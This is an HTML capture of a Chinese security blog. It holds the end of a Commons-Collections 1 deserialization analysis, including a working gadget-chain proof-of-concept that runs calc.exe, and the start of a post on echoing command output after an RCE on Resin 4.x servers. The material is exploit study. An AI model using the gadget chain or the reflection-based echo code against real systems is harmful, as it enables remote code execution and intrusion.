&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以，将绑定了恶意ChainedTransformer的AnnotationInvocationHandler序列化发给目标程序即可。代码如下：</p>
<h5 id="poc-2"><a href="#poc-2" class="headerlink" title="poc_2"></a>poc_2</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">////复制这段代码 运行并调试</span></span><br><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">poc_2</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//构造一个Transformer(转换器)数组</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">               <span class="comment">//Runtime不可序列化，但是Class可以，具体逻辑简单分析即可</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//用Transformer数组实例化Transformer链</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">    </span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//为map绑定Transformer链，生成TransformedMap</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//通过反射找到 漏洞触发类AnnotationInvocationHandler的class对象</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取漏洞触发类AnnotationInvocationHandler的实例</span></span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line">    </span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>);</span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">        <span class="comment">//服务端反序列化漏洞触发对象，执行恶意的转换逻辑</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h4 id="4-TransformedMap介绍"><a href="#4-TransformedMap介绍" class="headerlink" title="4. TransformedMap介绍"></a>4. TransformedMap介绍</h4><ul>
<li><p>java.util.Map 是一个接口，<strong><u>简称</u></strong>为Map，jdk中有不同的实现，<strong><u>这里统称</u></strong>为jdk_map_impl（如HashMap），是<strong><u>键值对</u></strong>的集合</p>
</li>
<li><p>org.apache.commons.collections.map.TransformedMap <strong><u>简称</u></strong> TransformedMap ，是common-collection对Map的<strong><u>实现</u></strong>，可以对jdk中的Map的<strong><u>实现</u></strong>进行<strong><u>增强</u></strong>。</p>
</li>
<li><p>怎么增强？TransformedMap可以 为jdk_map_impl(如HashMap)绑定一个KEY的Transformer和一个VALUE的Transformer，在向jdk_map_impl类型的对象<strong><u>写入键值对之前</u></strong>，会<strong><u>先调用</u></strong>其绑定的KEY和VALUE的Transformer.transform转换为新的KEY’和VALUE’后再写入，代码如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//TransformedMap最终会间接继承AbstractMapDecorator一个map字段，并在调用TransformedMap.decorate的时候初始化它。AbstractMapDecorator实现了java.util.Map接口。</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractMapDecorator</span> <span class="keyword">implements</span> <span class="title">Map</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">transient</span> Map map;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">extends</span> <span class="title">AbstractMapDecorator</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">MapEntry</span> <span class="keyword">extends</span> <span class="title">AbstractMapEntryDecorator</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">MapEntry</span><span class="params">(Entry entry, AbstractInputCheckedMapDecorator parent)</span> 		</span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(entry);</span><br><span class="line">            <span class="keyword">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="comment">//实现了java.util.Map.Entry接口的setValue方法。可以给Map中某一键值对赋值。</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">            <span class="comment">//调用TransformedMap.checkSetValue得到转换后的value对象</span></span><br><span class="line">            value = <span class="keyword">this</span>.parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">super</span>.entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span> <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用静态方法TransformedMap.decorate，构造出一个TransformedMap对象。decorate有三个参数，可以将一个java.util.Map和key/value的Transformer绑定。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">transformKey</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.keyTransformer == <span class="keyword">null</span> ? object : <span class="keyword">this</span>.keyTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">transformValue</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer == <span class="keyword">null</span> ? object : <span class="keyword">this</span>.valueTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//调用valueTransformer.transform对value对象进行转换</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="comment">//TransformedMap在对map字段进行填充时，会先调用相应的Transformer接口的transform方法对key/value对象进行转换。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">put</span><span class="params">(Object key, Object value)</span> </span>&#123;</span><br><span class="line">        key = <span class="keyword">this</span>.transformKey(key);</span><br><span class="line">        value = <span class="keyword">this</span>.transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.getMap().put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>Transformer有多种实现，这里只关注三种。</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622623055344-1623304151023.png" alt="1622623055344"></p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="comment">//Transformer.transform输入一个类型的对象，转换成另一个类型的对象。</span></span><br><span class="line">    <span class="function">Object <span class="title">transform</span><span class="params">(Object var1)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//设置要转换的目标对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//将传入对象转换为固定的目标对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//设置转换方法名和参数列表</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//设置转换方法名和参数列表</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="keyword">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="keyword">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//传入对象，反射调用转换方法，返回转换后的对象，转换方法由传入对象的类定义。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">		Method method = cls.getMethod(<span class="keyword">this</span>.iMethodName, <span class="keyword">this</span>.iParamTypes);</span><br><span class="line">		<span class="keyword">return</span> method.invoke(input, <span class="keyword">this</span>.iArgs);</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="comment">//设置一个Transformer链</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="comment">//遍历Transformer链，传入对象经多个Transformer依次处理后返回</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">          object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  InvokerTransformer转换对象的流程如下(custom_method由in_obj的类自定义)：<br>  <img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622623085984-1623304151023.png" alt="1622623085984"></p>
<p>  ChainedTransformer转换对象的流程如下：</p>
<p><img src="/2021/06/03/commons-collection1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/1622623120376-1623304151023.png" alt="1622623120376"></p>
<p><strong>poc来自</strong>：<a href="https://xz.aliyun.com/t/7031" target="_blank" rel="noopener"> JAVA反序列化 - Commons-Collections组件</a></p>
<p>在<strong>藏青</strong>师傅的建议下，通过cc1入门了一下反序列化漏洞</p>
<p>分析漏洞很多思路来源于和<strong>Mmuzz</strong>师傅的讨论，果然分布式学习是第一生产力！！！</p>
<p>第一次写文章超级痛苦，<strong>瓜哥</strong>给了很多行文上的指导</p>
<p>一直没能改的比较满意，但是再拖下去要被<strong>藏青</strong>师傅打死了，就这样先发了（才不是因为写不下去了</p>
<p>漏洞分析两小时，文章写一周</p>
<p>果然写文章是阻碍进步的究极原因啊（不是</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">某微RCE回显利用分析</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-05-20 15:03:08" itemprop="dateCreated datePublished" datetime="2021-05-20T15:03:08+08:00">2021-05-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-05-25 14:03:40" itemprop="dateModified" datetime="2021-05-25T14:03:40+08:00">2021-05-25</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/" itemprop="url" rel="index">
                    <span itemprop="name">JAVA</span>
                  </a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/JAVA/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" itemprop="url" rel="index">
                    <span itemprop="name">漏洞利用</span>
                  </a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>​        最近某微爆出RCE漏洞，本想着通过相对路径写入shell，但是不知是什么原因，在实际渗透中并没有成功，内存马这里也考虑了一下，但是由于这里的利用需要将class经过BCEL编码，由于无法将两个类进行BCEL编码，所以只能放弃了种内存马的想法，那目前最稳妥的方法就是获得命令执行的结果，让攻击者根据自己的需求去完成后续的利用。</p>
<h2 id="Resin-4-x获取命令执行结果"><a href="#Resin-4-x获取命令执行结果" class="headerlink" title="Resin 4.x获取命令执行结果"></a>Resin 4.x获取命令执行结果</h2><p>​        有大佬已经给出了在Resin 4.x中获取回显的方法了，下面我们先学习一下他的思路。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class tcpsocketLinkClazz = Thread.currentThread().getContextClassLoader().loadClass(<span class="string">"com.caucho.network.listen.TcpSocketLink"</span>); <span class="comment">//获取TcpSocketLink Class对象。</span></span><br><span class="line">    Method getCurrentRequestM = tcpsocketLinkClazz.getMethod(<span class="string">"getCurrentRequest"</span>); <span class="comment">//通过反射得到getCurrentRequest方法</span></span><br><span class="line">    Object currentRequest = getCurrentRequestM.invoke((Object)<span class="keyword">null</span>); <span class="comment">//调用getCurrentRequest方法获取返回结果</span></span><br><span class="line">    Field f = currentRequest.getClass().getSuperclass().getDeclaredField(<span class="string">"_responseFacade"</span>);<span class="comment">//获取_responseFacade变量</span></span><br><span class="line">    f.setAccessible(<span class="keyword">true</span>); <span class="comment">//改变获取_responseFacade变量的访问权限</span></span><br><span class="line">    Object response = f.get(currentRequest);<span class="comment">//获取response对象</span></span><br><span class="line">    Method getWriterM = response.getClass().getMethod(<span class="string">"getWriter"</span>); <span class="comment">//获取getWriter方法</span></span><br><span class="line">    Writer w = (Writer)getWriterM.invoke(response); <span class="comment">//调用getWriter获取Writer独享</span></span><br><span class="line">    w.write(<span class="string">"powered by potatso"</span>); <span class="comment">//写入回显内容</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">    var11.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        我们先看看在resin 4.X中，如何获取response对象。为此我写了一个servlet并打印出到达servlet的调用栈。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">doGet:<span class="number">98</span>, HelloWorld</span><br><span class="line">service:<span class="number">120</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">service:<span class="number">97</span>, HttpServlet (javax.servlet.http)</span><br><span class="line">doFilter:<span class="number">109</span>, ServletFilterChain (com.caucho.server.dispatch)</span><br><span class="line">doFilter:<span class="number">10</span>, FirstFilter</span><br><span class="line">doFilter:<span class="number">89</span>, FilterFilterChain (com.caucho.server.dispatch)</span><br><span class="line">doFilter:<span class="number">156</span>, WebAppFilterChain (com.caucho.server.webapp)</span><br><span class="line">doFilter:<span class="number">95</span>, AccessLogFilterChain (com.caucho.server.webapp)</span><br><span class="line">service:<span class="number">314</span>, ServletInvocation (com.caucho.server.dispatch)</span><br><span class="line">handleRequest:<span class="number">843</span>, HttpRequest (com.caucho.server.http)</span><br><span class="line">dispatchRequest:<span class="number">1395</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">handleRequest:<span class="number">1351</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">handleRequestsImpl:<span class="number">1335</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">handleRequests:<span class="number">1243</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">handleAcceptTaskImpl:<span class="number">1037</span>, TcpSocketLink (com.caucho.network.listen)</span><br><span class="line">runThread:<span class="number">117</span>, ConnectionTask (com.caucho.network.listen)</span><br><span class="line">run:<span class="number">93</span>, ConnectionTask (com.caucho.network.listen)</span><br><span class="line">handleTasks:<span class="number">175</span>, SocketLinkThreadLauncher (com.caucho.network.listen)</span><br><span class="line">run:<span class="number">61</span>, TcpSocketAcceptThread (com.caucho.network.listen)</span><br><span class="line">runTasks:<span class="number">173</span>, ResinThread2 (com.caucho.env.thread2)</span><br><span class="line">run:<span class="number">118</span>, ResinThread2 (com.caucho.env.thread2)</span><br></pre></td></tr></table></figure>

<p>​        Response对象主要来自于<code>com.caucho.server.http.HttpRequest#handleRequest</code></p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524155652633.png" alt="image-20210524155652633"></p>
<p> <code>com.caucho.server.http.AbstractHttpRequest#getResponseFacade</code>中返回了Response对象。所以如果我们能获取到AbstractHttpRequest对象并调用该对象的getResponseFacade方法，即可获取response对象。</p>
<p><img src="/2021/05/20/%E6%9F%90%E5%BE%AERCE%E5%9B%9E%E6%98%BE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/image-20210524155750330.png" alt="image-20210524155750330"></p>
<p>​        现在的目标转到获取AbstractHttpRequest对象,再查看下类的继承关系，通过下面的继承关系可以得到，想要获取AbstractHttpRequest对象，也可以获取它的子类或者父类。当然获取父类不一定就能得到AbstractHttpRequest对象，这个和具体返回的对象是什么类型有关系。要想通过反射得到对应的对象，主要还是要寻找返回类型为该对象并且由static修饰的方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static ProtocolConnection</span><br><span class="line">public static AbstractProtocolConnection</span><br><span class="line">public static AbstractHttpRequest</span><br><span class="line">public static FastCgiRequest</span><br><span class="line">public static HttpRequest</span><br><span class="line">public static SocketPolicyRequest</span><br><span class="line">public static SocketPolicyRequest</span><br><span class="line">public static HmuxRequest</span><br></pre></td></tr></table></figure>

